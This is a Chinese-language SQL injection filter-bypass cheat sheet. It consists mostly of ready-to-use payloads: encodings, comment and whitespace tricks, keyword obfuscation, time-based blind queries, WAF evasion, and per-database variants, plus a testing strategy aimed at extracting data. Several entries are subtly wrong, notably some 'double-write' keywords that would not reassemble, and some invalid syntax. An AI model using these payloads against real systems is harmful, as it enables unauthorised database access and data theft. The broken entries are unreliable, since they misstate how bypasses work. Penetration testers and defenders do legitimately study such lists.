# SQL 注入过滤器绕过速查表

## 快速参考

### 基础 Payload
```sql
' OR 1=1--
' OR 1=1#
' AND 1=1--
' UNION SELECT 1,2,3--
```

### 编码绕过
```sql
%27%20OR%201%3D1--
%2527%2520OR%25201%253D1--
0x27204F5220313D31--
```

---

## 常见过滤器绕过表

| 过滤器 | 绕过方法 | 示例 |
|--------|----------|------|
| **空格** | 注释符 | `'/**/OR/**/1=1--` |
| | 换行符 | `'%0AOR%0A1=1--` |
| | 制表符 | `'%09OR%091=1--` |
| | 括号 | `' OR(1=1)--` |
| **注释符** | 其他注释符 | `' OR 1=1#` |
| | 分号 | `' OR 1=1;` |
| | NULL 字节 | `' OR 1=1%00` |
| **单引号** | 十六进制 | `SELECT * FROM users WHERE username=0x61646D696E--` |
| | 双引号 | `SELECT * FROM users WHERE username="admin"--` |
| | CHAR 函数 | `SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--` |
| **等号** | LIKE | `' OR 1 LIKE 1--` |
| | REGEXP | `' OR 1 REGEXP 1--` |
| | BETWEEN | `' OR 1 BETWEEN 1 AND 1--` |
| | IN | `' OR 1 IN (1)--` |
| | <> | `' OR 1<>0--` |
| **AND** | && | `' && 1=1--` |
| | XOR | `' XOR 1=1--` |
| | NOT | `' NOT 1=2--` |
| **OR** | \|\| | `' \|\| 1=1--` |
| | XOR | `' XOR 1=1--` |
| **SELECT** | 大小写 | `' SeLeCt 1,2,3--` |
| | 双写 | `' SeLeCt SeLeCt 1,2,3--` |
| | 编码 | `%53%45%4C%45%43%54` |
| **UNION** | 大小写 | `' UnIoN SeLeCt 1,2,3--` |
| | 双写 | `' UnUnIoOnIoN SeSeLeCt 1,2,3--` |
| | 编码 | `%55%4E%49%4F%4E` |
| **WHERE** | 大小写 | `' WhErE 1=1--` |
| | 双写 | `' WhWhErEeRe 1=1--` |
| | 编码 | `%57%48%45%52%45` |
| **FROM** | 大小写 | `' FrOm users--` |
| | 双写 | `' FrFrOmOm users--` |
| | 编码 | `%46%52%4F%4D` |
| **ORDER BY** | 大小写 | `' OrDeR By 1--` |
| | 双写 | `' OrOrDeRr By 1--` |
| | 编码 | `%4F%52%44%45%52%20%42%59` |
| **LIMIT** | 大小写 | `' LiMiT 1--` |
| | 双写 | `' LiLiMiTt 1--` |
| | 编码 | `%4C%49%4D%49%54` |
| **GROUP BY** | 大小写 | `' GrOuP By 1--` |
| | 双写 | `' GrGrOuPp By 1--` |
| | 编码 | `%47%52%4F%55%50%20%42%59` |
| **HAVING** | 大小写 | `' HaViNg 1=1--` |
| | 双写 | `' HaHaViNgg 1=1--` |
| | 编码 | `%48%41%56%49%4E%47` |
| **DROP** | 大小写 | `' DrOp TaBlE users--` |
| | 双写 | `' DrDrOpOp TaTaBlEe users--` |
| | 编码 | `%44%52%4F%50` |
| **INSERT** | 大小写 | `' InSeRt InTo users--` |
| | 双写 | `' InInSeRtrt InTo users--` |
| | 编码 | `%49%4E%53%45%52%54` |
| **UPDATE** | 大小写 | `' UpDaTe users--` |
| | 双写 | `' UpUpDaTete users--` |
| | 编码 | `%55%50%44%41%54%45` |
| **DELETE** | 大小写 | `' DeLeTe FrOm users--` |
| | 双写 | `' DeDeLeTete FrOm users--` |
| | 编码 | `%44%45%4C%45%54%45` |
| **CREATE** | 大小写 | `' CrEaTe TaBlE test--` |
| | 双写 | `' CrCrEaTete TaBlE test--` |
| | 编码 | `%43%52%45%41%54%45` |
| **ALTER** | 大小写 | `' AlTeR TaBlE users--` |
| | 双写 | `' AlAlTeRr TaBlE users--` |
| | 编码 | `%41%4C%54%45%52` |

---

## 编码绕过速查

### URL 编码

```sql
-- 单次 URL 编码
%27%20OR%201%3D1--
%27%20OR%201%3D1%23

-- 双重 URL 编码
%2527%2520OR%25201%253D1--
%2527%2520OR%25201%253D1%2523

-- 三重 URL 编码
%252527%252520OR%2525201%25253D1--
```

### 十六进制编码

```sql
-- 十六进制编码
' OR 1=1--
0x27204F5220313D31--

-- 十六进制编码字符串
SELECT * FROM users WHERE username=0x61646D696E--
SELECT * FROM users WHERE password=0x70617373776F7264--

-- 混合使用
' OR 1=0x31--
```

### Unicode 编码

```sql
-- Unicode 编码
' OR 1=1--
\u0027\u0020OR\u00201\u003D1--

-- Unicode 编码字符串
SELECT * FROM users WHERE username=\u0061\u0064\u006D\u0069\u006E--
SELECT * FROM users WHERE password=\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064--
```

### Base64 编码

```sql
-- Base64 编码（需要在应用程序中解码）
JyBPUiAxPTEtLQ==  -- ' OR 1=1--
YWRtaW4=  -- admin
cGFzc3dvcmQ=  -- password
```

### ASCII 编码

```sql
-- ASCII 编码
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--
SELECT * FROM users WHERE password=CHAR(112,97,115,115,119,111,114,100)--

-- 混合使用
' OR 1=CHAR(49)--
```

---

## 空格过滤绕过速查

### 注释符替代

```sql
-- 使用 /**/ 替代空格
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/1,2,3--
'/**/ORDER/**/BY/**/1--
```

### 换行符替代

```sql
-- 使用 %0A 替代空格
'%0AOR%0A1=1--
'%0AUNION%0ASELECT%0A1,2,3--
'%0AORDER%0ABY%0A1--
```

### 制表符替代

```sql
-- 使用 %09 替代空格
'%09OR%091=1--
'%09UNION%09SELECT%091,2,3--
'%09ORDER%09BY%091--
```

### 括号替代

```sql
-- 使用括号替代空格
' OR(1=1)--
' UNION(SELECT(1),2,3)--
' ORDER(BY(1))--
```

### 加号替代

```sql
-- 使用 + 替代空格
'+OR+1=1--
'+UNION+SELECT+1,2,3--
'+ORDER+BY+1--
```

---

## 注释符过滤绕过速查

### 其他注释符

```sql
-- 使用 # 替代 --
' OR 1=1#
' UNION SELECT 1,2,3#

-- 使用 ; 替代 --
' OR 1=1;
' UNION SELECT 1,2,3;

-- 使用 %00 替代 --
' OR 1=1%00
' UNION SELECT 1,2,3%00
```

### 内联注释

```sql
-- 使用 /*!*/ 替代空格
' /*!OR*/ 1=1--
' /*!UNION*/ /*!SELECT*/ 1,2,3--

-- 使用 /*!00000*/ 版本注释
' /*!00000OR*/ 1=1--
' /*!00000UNION*/ /*!00000SELECT*/ 1,2,3--
```

---

## 关键字过滤绕过速查

### 大小写绕过

```sql
-- 混合大小写
' oR 1=1--
' uNiOn sElEcT 1,2,3--
' AnD 1=1--
' OrDeR By 1--
' WhErE 1=1--
' FrOm users--
' LiMiT 1--
' GrOuP By 1--
' HaViNg 1=1--
```

### 双写绕过

```sql
-- 双写关键字
' OORR 1=1--
' UNUNIONION SESELECTLECT 1,2,3--
' ANANDD 1=1--
' ORORDEDER BY BY 1--
' WHWHEREERE 1=1--
' FRFROMOM users--
' LILIMITIT 1--
' GRGROUPOUP BY BY 1--
' HHAHAVINGNG 1=1--
```

### 特殊字符绕过

```sql
-- 使用特殊字符分割关键字
' OR/**/1=1--
' OR+1=1--
' OR%201=1--
' OR%0A1=1--
' OR%091=1--
```

---

## 特殊字符过滤绕过速查

### 单引号过滤绕过

```sql
-- 使用十六进制编码
SELECT * FROM users WHERE username=0x61646D696E--

-- 使用双引号（如果支持）
SELECT * FROM users WHERE username="admin"--

-- 使用反引号（MySQL）
SELECT * FROM users WHERE username=`admin`--

-- 使用 CHAR 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--

-- 使用 CONCAT 函数
SELECT * FROM users WHERE username=CONCAT('a','d','m','i','n')--
```

### 等号过滤绕过

```sql
-- 使用 LIKE
' OR 1 LIKE 1--

-- 使用 REGEXP
' OR 1 REGEXP 1--

-- 使用 BETWEEN
' OR 1 BETWEEN 1 AND 1--

-- 使用 IN
' OR 1 IN (1)--

-- 使用 <>
' OR 1<>0--

-- 使用 !=
' OR 1!=0--

-- 使用 <
' OR 1<2--

-- 使用 >
' OR 1>0--
```

### 逗号过滤绕过

```sql
-- 使用 JOIN 替代
SELECT * FROM users JOIN (SELECT 1,2,3) AS t--

-- 使用 OFFSET 替代
SELECT * FROM users LIMIT 1 OFFSET 0--

-- 使用 CASE WHEN 替代
SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END--

-- 使用 SUBSTRING 替代
SELECT SUBSTRING((SELECT database()),1,1)--
```

---

## AND/OR 过滤绕过速查

### AND 过滤绕过

```sql
-- 使用 &&
' && 1=1--

-- 使用 XOR
' XOR 1=1--

-- 使用 NOT
' NOT 1=2--

-- 使用 BETWEEN
' 1 BETWEEN 1 AND 1--

-- 使用 IN
' 1 IN (1)--

-- 使用 LIKE
' 1 LIKE 1--

-- 使用 REGEXP
' 1 REGEXP 1--
```

### OR 过滤绕过

```sql
-- 使用 ||
' || 1=1--

-- 使用 XOR
' XOR 1=1--

-- 使用 NOT
' NOT 1=0--

-- 使用 BETWEEN
' 1 BETWEEN 0 AND 1--

-- 使用 IN
' 1 IN (0,1)--

-- 使用 LIKE
' 1 LIKE 1--

-- 使用 REGEXP
' 1 REGEXP 1--
```

---

## 函数过滤绕过速查

### SUBSTRING 过滤绕过

```sql
-- 使用 MID
SELECT MID((SELECT database()),1,1)--

-- 使用 SUBSTR
SELECT SUBSTR((SELECT database()),1,1)--

-- 使用 LEFT
SELECT LEFT((SELECT database()),1)--

-- 使用 RIGHT
SELECT RIGHT((SELECT database()),1)--
```

### ASCII 过滤绕过

```sql
-- 使用 ORD
SELECT ORD(SUBSTRING((SELECT database()),1,1))--

-- 使用 HEX
SELECT HEX(SUBSTRING((SELECT database()),1,1))--

-- 使用 BINARY
SELECT BINARY(SUBSTRING((SELECT database()),1,1))--
```

### CONCAT 过滤绕过

```sql
-- 使用 CONCAT_WS
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n')--

-- 使用 GROUP_CONCAT
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n')--

-- 使用 ||
SELECT 'a' || 'd' || 'm' || 'i' || 'n'--

-- 使用 +
SELECT 'a' + 'd' + 'm' + 'i' + 'n'--
```

### SLEEP 过滤绕过

```sql
-- 使用 BENCHMARK
SELECT BENCHMARK(5000000,MD5(1))--

-- 使用笛卡尔积
SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B--

-- 使用 WAITFOR DELAY（SQL Server）
WAITFOR DELAY '0:0:5'--

-- 使用 pg_sleep（PostgreSQL）
SELECT pg_sleep(5)--

-- 使用 DBMS_PIPE.RECEIVE_MESSAGE（Oracle）
SELECT DBMS_PIPE.RECEIVE_MESSAGE('X',5)--
```

---

## WAF 绕过速查

### HTTP 参数污染

```sql
-- 使用多个相同参数
?id=1&id=2&id=3

-- 使用数组参数
?id[]=1&id[]=2&id[]=3
```

### 分块编码

```http
POST /login HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

4
user
5
=admin
0
```

### 大小写混淆

```sql
-- 混合大小写
' oR 1=1--
' uNiOn sElEcT 1,2,3--
' AnD 1=1--
```

### 编码混淆

```sql
-- 混合编码
' OR 1=1--
%27%20%4F%52%20%31%3D%31--

-- 双重编码
%2527%2520%254F%2552%2520%2531%253D%2531--

-- Unicode 编码
\u0027\u0020OR\u00201\u003D1--
```

### 注释混淆

```sql
-- 内联注释
' /*!OR*/ 1=1--
' /*!UNION*/ /*!SELECT*/ 1,2,3--

-- 版本注释
' /*!00000OR*/ 1=1--
' /*!00000UNION*/ /*!00000SELECT*/ 1,2,3--

-- 多行注释
'
OR
1=1
--
```

---

## 数据库特定绕过速查

### MySQL 绕过

```sql
-- 使用十六进制编码
SELECT * FROM users WHERE username=0x61646D696E--

-- 使用反引号
SELECT * FROM users WHERE username=`admin`--

-- 使用 /*!*/ 内联注释
' /*!UNION*/ /*!SELECT*/ 1,2,3--

-- 使用 /*!00000*/ 版本注释
' /*!00000UNION*/ /*!00000SELECT*/ 1,2,3--
```

### PostgreSQL 绕过

```sql
-- 使用双引号
SELECT * FROM users WHERE username="admin"--

-- 使用 CHR 函数
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--

-- 使用 $...$ 字符串
SELECT * FROM users WHERE username=$$admin$$--
```

### SQL Server 绕过

```sql
-- 使用双引号
SELECT * FROM users WHERE username="admin"--

-- 使用 CHAR 函数
SELECT * FROM users WHERE username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--

-- 使用 + 连接
SELECT * FROM users WHERE username='a'+'d'+'m'+'i'+'n'--
```

### Oracle 绕过

```sql
-- 使用 CHR 函数
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--

-- 使用 || 连接
SELECT * FROM users WHERE username='a'||'d'||'m'||'i'||'n'--

-- 使用 q'...' 字符串
SELECT * FROM users WHERE username=q'[admin]'--
```

### SQLite 绕过

```sql
-- 使用双引号
SELECT * FROM users WHERE username="admin"--

-- 使用 CHAR 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--

-- 使用 || 连接
SELECT * FROM users WHERE username='a'||'d'||'m'||'i'||'n'--
```

---

## 实战绕过案例速查

### 案例 1：空格过滤

```sql
-- 原始 Payload
' OR 1=1--

-- 绕过方法
'/**/OR/**/1=1--
'%0AOR%0A1=1--
'%09OR%091=1--
' OR(1=1)--
```

### 案例 2：注释符过滤

```sql
-- 原始 Payload
' OR 1=1--

-- 绕过方法
' OR 1=1#
' OR 1=1;
' OR 1=1%00
```

### 案例 3：单引号过滤

```sql
-- 原始 Payload
' OR 1=1--

-- 绕过方法
0x27204F5220313D31--
SELECT * FROM users WHERE username=0x61646D696E--
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--
```

### 案例 4：关键字过滤

```sql
-- 原始 Payload
' UNION SELECT 1,2,3--

-- 绕过方法
' uNiOn sElEcT 1,2,3--
' UNUNIONION SESELECTLECT 1,2,3--
' /*!UNION*/ /*!SELECT*/ 1,2,3--
```

### 案例 5：等号过滤

```sql
-- 原始 Payload
' OR 1=1--

-- 绕过方法
' OR 1 LIKE 1--
' OR 1 REGEXP 1--
' OR 1 BETWEEN 1 AND 1--
' OR 1 IN (1)--
' OR 1<>0--
```

### 案例 6：AND/OR 过滤

```sql
-- 原始 Payload
' AND 1=1--

-- 绕过方法
' && 1=1--
' XOR 1=1--
' NOT 1=2--
```

### 案例 7：函数过滤

```sql
-- 原始 Payload
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--

-- 绕过方法
' AND ORD(MID((SELECT database()),1,1))>64--
' AND ORD(SUBSTR((SELECT database()),1,1))>64--
' AND ORD(LEFT((SELECT database()),1))>64--
```

### 案例 8：WAF 过滤

```sql
-- 原始 Payload
' OR 1=1--

-- 绕过方法
%27%20OR%201%3D1--
%2527%2520OR%25201%253D1--
\u0027\u0020OR\u00201\u003D1--
' /*!00000OR*/ 1=1--
```

---

## 测试策略

### 1. 基础测试
- 尝试最简单的 payload
- 确认漏洞存在性

### 2. 编码测试
- 尝试各种编码方式
- 测试过滤器对编码的处理

### 3. 绕过测试
- 尝试各种绕过技术
- 测试过滤器的边界条件

### 4. 组合测试
- 组合多种绕过技术
- 持续尝试新方法

### 5. 数据库特定测试
- 根据数据库类型调整 payload
- 使用数据库特定函数

---

## 成功标准

- 响应内容发生变化
- 响应时间发生变化（时间盲注）
- 错误信息泄露（错误注入）
- 数据成功提取

---

**最后更新**: 2026-02-09
**版本**: 1.0
